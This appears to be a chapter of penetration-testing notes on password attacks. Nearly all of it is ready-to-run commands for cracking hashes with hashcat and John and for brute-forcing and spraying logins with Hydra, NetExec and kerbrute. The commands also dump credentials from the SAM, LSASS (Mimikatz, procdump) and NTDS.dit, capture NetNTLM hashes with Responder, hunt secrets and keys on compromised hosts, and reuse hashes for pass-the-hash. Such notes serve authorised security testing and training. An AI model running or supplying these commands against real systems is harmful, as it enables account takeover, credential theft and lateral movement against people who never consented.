# 17 — Password Attacks

Cracking captured hashes, online password guessing, and hunting for credentials on compromised hosts.

## Contents

- [Hash identification](#hash-identification)
- [hashcat — workflow](#hashcat-workflow)
- [John the Ripper](#john-the-ripper)
- [Wordlists](#wordlists)
- [Online password attacks](#online-password-attacks)
- [Dumping hashes](#dumping-hashes)
- [NetNTLM capture & relay](#netntlm-capture-relay)
- [Credential hunting on a foothold](#credential-hunting-on-a-foothold)
- [Hash → ticket / session reuse](#hash-ticket-session-reuse)
- [Sources](#sources)

## Hash identification

```bash
hashid '$2y$10$...'
hashcat --identify '$2y$10$...'

# A Python-only fallback
hash-identifier
```

Common hash signatures:

| Format | Example prefix / shape | Hashcat mode |
|---|---|---|
| MD5 | 32 hex chars | 0 |
| SHA-1 | 40 hex chars | 100 |
| SHA-256 | 64 hex chars | 1400 |
| SHA-512 | 128 hex chars | 1700 |
| NTLM (NT hash) | 32 hex chars | 1000 |
| LM | 32 hex chars (often `aad3b...`) | 3000 |
| NetNTLMv1 | `user::DOMAIN:resp:resp:chal` | 5500 |
| NetNTLMv2 | `user::DOMAIN:chal:hmac:blob` | 5600 |
| Kerberos 5 TGS-REP (Kerberoast) | `$krb5tgs$23$*...` | 13100 |
| Kerberos 5 AS-REP roast | `$krb5asrep$23$...` | 18200 |
| DCC (mscash) | `<user>:$DCC$...` | 1100 |
| DCC2 (mscash2) | `$DCC2$10240#user#hash` | 2100 |
| `$1$` MD5crypt | `$1$salt$hash` | 500 |
| `$2*$` bcrypt | `$2y$cost$saltbase64hash` | 3200 |
| `$5$` SHA-256 crypt | `$5$rounds=...$salt$hash` | 7400 |
| `$6$` SHA-512 crypt | `$6$rounds=...$salt$hash` | 1800 |
| `$y$` yescrypt | `$y$j9T$salt$hash` | (john) |
| WPA(2) | hccapx / 22000 file | 22000 |
| MS Office docs | `$office$...` | 9400-9800 |
| PDF | `$pdf$...` | 10400-10700 |
| ZIP | `$zip2$...` | 13600 |
| 7z | `$7z$...` | 11600 |
| KeePass | `$keepass$...` | 13400 |

Full list: `hashcat --example-hashes`.

## hashcat — workflow

```bash
# Attack modes
# 0  = straight (wordlist)
# 1  = combinator (wordlist + wordlist)
# 3  = brute-force / mask
# 6  = hybrid wordlist + mask
# 7  = hybrid mask + wordlist
# 9  = associative (one hash per line)

# Straight wordlist
hashcat -m 1000 hashes.txt rockyou.txt

# Wordlist + rules
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r rules/d3ad0ne.rule -r rules/best64.rule

# Mask attack (charsets ?l ?u ?d ?s ?a ?b)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d        # Aaaaaa11
hashcat -m 1000 -a 3 hashes.txt --increment --increment-min 6 ?a?a?a?a?a?a?a?a

# Custom charsets
hashcat -m 1000 -a 3 -1 ?l?u hashes.txt ?1?1?1?1?d?d?s

# Hybrid: word + mask
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?s

# Show cracked
hashcat -m 1000 hashes.txt --show
hashcat -m 1000 hashes.txt --left              # uncracked subset

# Performance
hashcat -m 1000 hashes.txt rockyou.txt -O      # optimized kernels (length<=27)
hashcat -m 1000 hashes.txt rockyou.txt -w 3    # workload profile 1-4
hashcat -b -m 1000                              # benchmark mode

# Restore / pause
hashcat --session=eng1 -m 1000 hashes.txt rockyou.txt
hashcat --restore --session=eng1
```

Useful rule files (in `/usr/share/hashcat/rules/`): `best64.rule`, `d3ad0ne.rule`, `T0XlC.rule`, `dive.rule`, `OneRuleToRuleThemAll.rule` (download separately).

## John the Ripper

```bash
john --list=formats | grep -i nt
john --format=nt hashes.txt --wordlist=rockyou.txt
john --format=nt hashes.txt --wordlist=rockyou.txt --rules=Jumbo
john --show --format=nt hashes.txt
john hashes.txt --incremental                 # built-in brute mode
john hashes.txt --mask='?u?l?l?l?l?d?d'

# Resume / sessions
john --session=eng1 hashes.txt --wordlist=rockyou.txt
john --restore=eng1
```

John's `*2hashcat` helpers extract hashes from files for `hashcat`:

```bash
zip2john archive.zip > zip.hash
office2john report.docx > office.hash
pdf2john report.pdf > pdf.hash
ssh2john id_rsa > id_rsa.hash
keepass2john db.kdbx > kp.hash
```

## Wordlists

```
/usr/share/wordlists/rockyou.txt(.gz)
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/Leaked-Databases/
/usr/share/seclists/Passwords/probable-v2-top1575.txt
```

Generate from a target:

```bash
# Spider a website for words
cewl -d 2 -m 6 https://target -w cewl.txt
cewl -d 2 -m 6 -e -a https://target -w cewl.txt   # emails + meta

# Mutate / combine
crunch 8 8 -t @@@@@@%% -o crunch.txt
hashcat --stdout rockyou.txt -r best64.rule > mutated.txt

# Add company/season/year patterns
echo -e "Welcome\nSummer\nWinter" | while read w; do
  for y in 2023 2024 2025; do echo "$w$y!"; done
done > common.txt
```

## Online password attacks

### Hydra

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://<T> -t 4 -f

# HTTP basic
hydra -l admin -P passwords.txt <T> http-get /admin/

# HTTP form (POST)
hydra -L users.txt -P passwords.txt <T> http-post-form \
  '/login.php:username=^USER^&password=^PASS^:F=Invalid'

# RDP / SMB / FTP / IMAP / VNC / etc.
hydra -L users.txt -P passwords.txt rdp://<T>
hydra -L users.txt -P passwords.txt -t 1 smb://<T>
hydra -L users.txt -P passwords.txt ftp://<T>
```

`-t` threads, `-f` stop on first success, `-V` verbose, `-vV` very verbose, `-s` port, `-o` output file.

### NetExec (former crackmapexec) — password spray

```bash
# Validate one cred against many hosts
netexec smb hosts.txt -u alice -p Pass1

# Spray one password across many users
netexec smb <DC> -u users.txt -p Spring2025! --continue-on-success

# Pass-the-hash
netexec smb <T> -u alice -H <NTLM-HASH>

# Same for other protocols
netexec winrm <T> -u users.txt -p 'Pass1'
netexec mssql <T> -u sa -p Pass1 -x 'whoami'
netexec ssh hosts.txt -u root -P passwords.txt
```

Always check the password policy first to avoid lockouts:

```bash
netexec smb <DC> -u alice -p Pass1 --pass-pol
```

### kerbrute (AD-specific)

```bash
# User enumeration via AS-REQ (no lockout)
kerbrute userenum -d corp.local --dc <DC> users.txt

# Password spray
kerbrute passwordspray -d corp.local --dc <DC> users.txt 'Spring2025!'
```

### Patator

When a service-specific tool fails, Patator's modular approach often works:

```bash
patator ssh_login host=<T> user=alice password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
```

## Dumping hashes

### Linux

```bash
# Need read access to /etc/shadow
unshadow /etc/passwd /etc/shadow > combined
john combined --wordlist=rockyou.txt
```

### Windows local SAM (offline)

```cmd
:: Need admin / SYSTEM
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Windows LSASS (online)

```cmd
:: Procdump — signed Microsoft binary (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Task manager UI: right-click lsass → Create dump file (admin)
```

```bash
pypykatz lsa minidump lsass.dmp
```

```powershell
# In-memory (mimikatz / nanodump / SharpKatz / etc.)
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords; exit"
```

### Domain — NTDS.dit (DC)

```bash
# Remote (admin on DC, via DRSUAPI replication)
impacket-secretsdump corp/Administrator:Pass1@<DC>
impacket-secretsdump -just-dc corp/Administrator:Pass1@<DC>
impacket-secretsdump -just-dc-ntlm corp/Administrator:Pass1@<DC>

# With hash
impacket-secretsdump -hashes :<NThash> corp/Administrator@<DC>

# From volume shadow copy (offline)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

`netexec` wraps this:

```bash
netexec smb <DC> -u Administrator -H <NThash> --ntds
netexec smb <DC> -u Administrator -p Pass1 --lsa
netexec smb <T>  -u Administrator -p Pass1 --sam
```

## NetNTLM capture & relay

Capture NetNTLMv2 by coercing a host to authenticate to you (LLMNR/NBT-NS poisoning, MitM, file://, UNC paths embedded in apps, etc.):

```bash
# Listener
sudo responder -I tun0 -wd

# When a victim authenticates, hash lands in stdout / Responder/logs/
hashcat -m 5600 ntlmv2.hash rockyou.txt
```

Relay (when SMB signing is not enforced on the victim) — see [20 AD Attacks](20-active-directory-attacks.md).

## Credential hunting on a foothold

### Linux

```bash
grep -RIn -E "password|passwd|secret|api[_-]?key" / 2>/dev/null --color
find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null
find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null
ls -la ~/.aws ~/.ssh ~/.gnupg ~/.docker
cat ~/.bash_history ~/.zsh_history /root/.*history 2>/dev/null
cat /etc/fstab                     # creds in mount options
cat /etc/cron* /var/spool/cron/* 2>/dev/null
```

### Windows

```cmd
findstr /S /I "password" C:\inetpub\*.config C:\Windows\System32\inetsrv\*
findstr /S /I "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.config
dir /s /b C:\ | findstr /I "unattend.xml sysprep.inf"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
cmdkey /list
```

```powershell
# DPAPI-protected creds + Chrome / Edge (lab)
Get-ChildItem -Recurse -Force "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -EA SilentlyContinue
```

Other places to check:
- KeePass / Bitwarden vault files in user profiles.
- VPN configs, RDP `.rdp` files (with stored creds).
- Browser profile dirs (Chromium-based: `Login Data` SQLite + DPAPI).
- Application config files (`web.config`, `appsettings.json`, `application.properties`, `wp-config.php`, `.env`, `id_rsa`, `kubeconfig`, `~/.aws/credentials`).
- Memory of running processes (`procdump` of an app that loads creds).

## Hash → ticket / session reuse

Once you have an NT hash, you don't always need to crack it:

- **Pass-the-hash** over SMB/WinRM/RDP (`netexec`, `evil-winrm`, `xfreerdp /pth`).
- **Overpass-the-hash** to get a Kerberos TGT (`Rubeus asktgt /rc4:<NThash>`).
- **Pass-the-ticket** with a `.ccache` / `.kirbi` (`KRB5CCNAME=...; impacket-psexec ...`).

Detail in [20 Active Directory Enumeration & Attacks](20-active-directory-attacks.md).

## Sources

- Hashcat wiki: https://hashcat.net/wiki/
- John the Ripper docs: https://www.openwall.com/john/doc/
- Hydra docs: https://github.com/vanhauser-thc/thc-hydra
- NetExec docs: https://www.netexec.wiki/
- Impacket: https://github.com/fortra/impacket
- Responder: https://github.com/lgandx/Responder
